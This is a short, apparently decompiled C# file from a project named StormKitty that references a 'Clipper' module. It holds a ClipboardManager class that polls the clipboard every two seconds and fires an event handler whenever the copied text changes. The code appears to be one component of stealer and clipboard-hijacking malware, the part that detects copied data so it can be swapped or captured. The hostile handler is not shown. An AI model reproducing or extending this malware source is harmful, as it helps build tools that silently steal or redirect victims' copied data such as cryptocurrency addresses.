﻿using System;
using System.Threading;
using Clipper;

namespace StormKitty
{
	// Token: 0x02000063 RID: 99
	internal sealed class ClipboardManager
	{
		// Token: 0x06000168 RID: 360 RVA: 0x0000B7C9 File Offset: 0x000099C9
		private static void Run()
		{
			for (;;)
			{
				Thread.Sleep(2000);
				ClipboardManager.ClipboardText = Clipboard.GetText();
				if (ClipboardManager.ClipboardText != ClipboardManager.PrevClipboard)
				{
					ClipboardManager.PrevClipboard = ClipboardManager.ClipboardText;
					EventManager.Action();
				}
			}
		}

		// Token: 0x040000E3 RID: 227
		public static string PrevClipboard = "";

		// Token: 0x040000E4 RID: 228
		public static string ClipboardText;

		// Token: 0x040000E5 RID: 229
		public static Thread MainThread = new Thread(new ThreadStart(ClipboardManager.Run));
	}
}
